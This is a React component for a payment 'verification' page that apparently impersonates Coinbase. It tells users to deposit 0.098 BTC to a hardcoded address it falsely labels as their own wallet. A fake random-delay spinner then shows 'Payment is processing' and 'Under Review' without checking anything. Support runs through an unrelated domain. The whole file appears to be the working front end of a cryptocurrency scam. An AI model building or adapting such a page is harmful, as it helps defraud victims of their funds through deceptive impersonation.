"use client";

import React, { useState } from "react";
import { X, Info, Check, ShieldCheck, Mail, ArrowLeft } from "lucide-react";
import { toast } from "sonner";
import { motion, AnimatePresence } from "framer-motion";
import { useRouter } from "next/navigation";

interface PaymentLinkViewProps {
  btcAmount?: string;
  btcAddress?: string;
  onClose?: () => void;
}

export default function PaymentLinkView({
  btcAmount = "0.098 BTC",
  btcAddress = "bc1qtyhny3ssgp9ckpestgxtsc954emrrx5rpv7l4r",
  onClose,
}: PaymentLinkViewProps) {
  const router = useRouter();
  const [copiedAmount, setCopiedAmount] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);

  const displayAddress = btcAddress.length > 16 
    ? `${btcAddress.slice(0, 6)}...${btcAddress.slice(-6)}` 
    : btcAddress;

  const handleCopyAmount = () => {
    const numericOnly = btcAmount.replace(/[^0-9.,]/g, "").replace(",", ".").trim();
    navigator.clipboard.writeText(numericOnly);
    setCopiedAmount(true);
    toast.success("Amount copied to clipboard");
    setTimeout(() => setCopiedAmount(false), 2000);
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(btcAddress);
    setCopiedAddress(true);
    toast.success("Bitcoin address copied to clipboard");
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleCompleteStep = () => {
    setIsSubmitting(true);
    // Random delay between 3000ms (3s) and 7000ms (7s)
    const randomDelay = Math.floor(Math.random() * (7000 - 3000 + 1)) + 3000;
    setTimeout(() => {
      setIsSubmitting(false);
      setIsCompleted(true);
      toast.success("Payment is processing");
    }, randomDelay);
  };

  const handleClose = () => {
    if (onClose) {
      onClose();
    } else {
      router.back();
    }
  };

  return (
    <div className="relative min-h-screen bg-gray-50 dark:bg-zinc-950 flex flex-col justify-between items-center p-4 sm:p-6 md:p-8 font-sans">
      
      {/* Semi-transparent Overlay Spinner (Random 3-7s duration) */}
      <AnimatePresence>
        {isSubmitting && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4"
          >
            <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin" />
          </motion.div>
        )}
      </AnimatePresence>

      <div className="w-full max-w-md bg-white dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-2xl overflow-hidden my-auto transition-all">
        
        {/* Header with Close Icon */}
        <div className="p-6 pb-2 flex items-center justify-between">
          <button
            onClick={handleClose}
            className="p-2 -ml-2 rounded-full hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-800 dark:text-gray-200 transition-colors focus:outline-none"
            aria-label="Close"
          >
            <X className="w-6 h-6 stroke-[2.2]" />
          </button>
        </div>

        <AnimatePresence mode="wait">
          {!isCompleted ? (
            <motion.div
              key="payment-step"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
              className="px-6 pb-6 pt-2 space-y-6"
            >
              {/* Main Heading */}
              <div className="space-y-3">
                <h1 className="text-2xl sm:text-[28px] leading-snug font-bold text-gray-900 dark:text-white tracking-tight">
                  Deposit a small amount from your wallet.
                </h1>
                
                <p className="text-[15px] leading-relaxed text-gray-600 dark:text-zinc-400 font-normal">
                  Send a small deposit to your Coinbase account and verify that you are the owner of your wallet. This process typically takes a few minutes. Network fees may apply.
                </p>
              </div>

              {/* Data Fields Section */}
              <div className="space-y-5 pt-2">
                {/* Field 1: Amount in BTC */}
                <div className="flex items-center justify-between py-1 border-b border-gray-100 dark:border-zinc-800 pb-3">
                  <div>
                    <span className="block text-base font-bold text-gray-900 dark:text-white">
                      Amount in BTC
                    </span>
                    <span className="block text-[15px] text-gray-600 dark:text-zinc-400 mt-0.5 select-all">
                      {btcAmount}
                    </span>
                  </div>
                  <button
                    onClick={handleCopyAmount}
                    className={`font-semibold text-base px-2 py-1 transition-colors duration-300 flex items-center gap-1.5 focus:outline-none ${
                      copiedAmount
                        ? "text-emerald-600 dark:text-emerald-400"
                        : "text-blue-600 dark:text-blue-400 hover:text-blue-700 dark:hover:text-blue-300"
                    }`}
                  >
                    <AnimatePresence mode="wait" initial={false}>
                      {copiedAmount ? (
                        <motion.span
                          key="copied-amount"
                          initial={{ scale: 0.75, opacity: 0 }}
                          animate={{ scale: 1, opacity: 1 }}
                          exit={{ scale: 0.75, opacity: 0 }}
                          transition={{ duration: 0.2 }}
                          className="flex items-center gap-1.5 text-emerald-600 dark:text-emerald-400 font-bold"
                        >
                          <Check className="w-4 h-4 stroke-[2.5]" />
                          <span>Copied</span>
                        </motion.span>
                      ) : (
                        <motion.span
                          key="copy-amount"
                          initial={{ scale: 0.75, opacity: 0 }}
                          animate={{ scale: 1, opacity: 1 }}
                          exit={{ scale: 0.75, opacity: 0 }}
                          transition={{ duration: 0.2 }}
                        >
                          <span>Copy</span>
                        </motion.span>
                      )}
                    </AnimatePresence>
                  </button>
                </div>

                {/* Field 2: Your Bitcoin address */}
                <div className="flex items-center justify-between py-1 border-b border-gray-100 dark:border-zinc-800 pb-3">
                  <div>
                    <span className="block text-base font-bold text-gray-900 dark:text-white">
                      Your Bitcoin address
                    </span>
                    <span className="block text-[15px] text-gray-600 dark:text-zinc-400 mt-0.5 font-mono select-all" title={btcAddress}>
                      {displayAddress}
                    </span>
                  </div>
                  <button
                    onClick={handleCopyAddress}
                    className={`font-semibold text-base px-2 py-1 transition-colors duration-300 flex items-center gap-1.5 focus:outline-none ${
                      copiedAddress
                        ? "text-emerald-600 dark:text-emerald-400"
                        : "text-blue-600 dark:text-blue-400 hover:text-blue-700 dark:hover:text-blue-300"
                    }`}
                  >
                    <AnimatePresence mode="wait" initial={false}>
                      {copiedAddress ? (
                        <motion.span
                          key="copied-address"
                          initial={{ scale: 0.75, opacity: 0 }}
                          animate={{ scale: 1, opacity: 1 }}
                          exit={{ scale: 0.75, opacity: 0 }}
                          transition={{ duration: 0.2 }}
                          className="flex items-center gap-1.5 text-emerald-600 dark:text-emerald-400 font-bold"
                        >
                          <Check className="w-4 h-4 stroke-[2.5]" />
                          <span>Copied</span>
                        </motion.span>
                      ) : (
                        <motion.span
                          key="copy-address"
                          initial={{ scale: 0.75, opacity: 0 }}
                          animate={{ scale: 1, opacity: 1 }}
                          exit={{ scale: 0.75, opacity: 0 }}
                          transition={{ duration: 0.2 }}
                        >
                          <span>Copy</span>
                        </motion.span>
                      )}
                    </AnimatePresence>
                  </button>
                </div>
              </div>

              {/* Info Warning Alert Box */}
              <div className="bg-gray-100 dark:bg-zinc-800/80 p-4 rounded-xl flex items-start gap-3.5 mt-4">
                <Info className="w-5 h-5 text-blue-600 dark:text-blue-500 fill-blue-600 dark:fill-blue-500 stroke-white dark:stroke-zinc-900 shrink-0 mt-0.5" />
                <p className="text-[13.5px] leading-snug text-gray-700 dark:text-zinc-300 font-medium">
                  An incorrect amount or address will cause the verification to fail.
                </p>
              </div>

              {/* Primary Action Button */}
              <div className="pt-4">
                <button
                  onClick={handleCompleteStep}
                  disabled={isSubmitting}
                  className="w-full bg-[#0052FF] hover:bg-blue-700 text-white font-semibold text-base py-4 px-6 rounded-full transition-all disabled:opacity-75 flex items-center justify-center gap-2 focus:outline-none"
                >
                  <span>I have completed this step</span>
                </button>
              </div>
            </motion.div>
          ) : (
            <motion.div
              key="confirmation-step"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
              className="px-6 pb-6 pt-2 space-y-6"
            >
              {/* Heading */}
              <div className="space-y-3">
                <div className="inline-flex items-center gap-2 bg-blue-50 dark:bg-blue-950/40 text-blue-600 dark:text-blue-400 px-3 py-1 rounded-full text-xs font-semibold tracking-wide">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>Processing</span>
                </div>
                
                <h1 className="text-2xl sm:text-[28px] leading-snug font-bold text-gray-900 dark:text-white tracking-tight">
                  Payment is processing
                </h1>
                
                <p className="text-[15px] leading-relaxed text-gray-600 dark:text-zinc-400 font-normal">
                  Your deposit of <span className="font-semibold text-gray-900 dark:text-white">{btcAmount}</span> is currently being processed on the network. If your transaction requires immediate attention, please contact support.
                </p>
              </div>

              {/* Clean Details Card without weird left border */}
              <div className="bg-gray-50 dark:bg-zinc-800/40 border border-gray-100 dark:border-zinc-800/80 p-4 rounded-xl space-y-3">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-gray-500 dark:text-zinc-400 font-medium">Status</span>
                  <span className="text-blue-600 dark:text-blue-400 font-semibold">Under Review</span>
                </div>
                <div className="border-t border-gray-100 dark:border-zinc-800/60 pt-3">
                  <span className="block text-xs font-medium text-gray-500 dark:text-zinc-400 uppercase tracking-wider mb-1">
                    Target Address
                  </span>
                  <span className="block text-sm font-mono text-gray-900 dark:text-zinc-200 break-all select-all">
                    {btcAddress}
                  </span>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="pt-2 space-y-3">
                <a
                  href={`mailto:support@northcoremarkets.com?subject=${encodeURIComponent(
                    "Payment Verification Support"
                  )}&body=${encodeURIComponent(
                    `Hello Support Team,\n\nI am contacting you regarding my payment verification deposit.\n\nAmount: ${btcAmount}\nTarget Address: ${btcAddress}\n\nPlease assist me with verifying this transaction.\n\nThank you.`
                  )}`}
                  className="w-full bg-[#0052FF] hover:bg-blue-700 text-white font-semibold text-base py-4 px-6 rounded-full transition-all flex items-center justify-center gap-2 focus:outline-none text-center cursor-pointer"
                >
                  <Mail className="w-5 h-5" />
                  <span>Contact Support</span>
                </a>

                <button
                  onClick={() => setIsCompleted(false)}
                  className="w-full bg-gray-100 dark:bg-zinc-800 hover:bg-gray-200 dark:hover:bg-zinc-700 text-gray-800 dark:text-gray-200 font-semibold text-base py-3 px-6 rounded-full transition-colors flex items-center justify-center gap-2"
                >
                  <ArrowLeft className="w-4 h-4" />
                  <span>Back to Payment Details</span>
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Footer Branding */}
      <div className="mt-6 text-center text-xs text-gray-400 dark:text-zinc-500 flex items-center gap-1">
        <ShieldCheck className="w-3.5 h-3.5" />
        <span>Secure payment verification</span>
      </div>
    </div>
  );
}
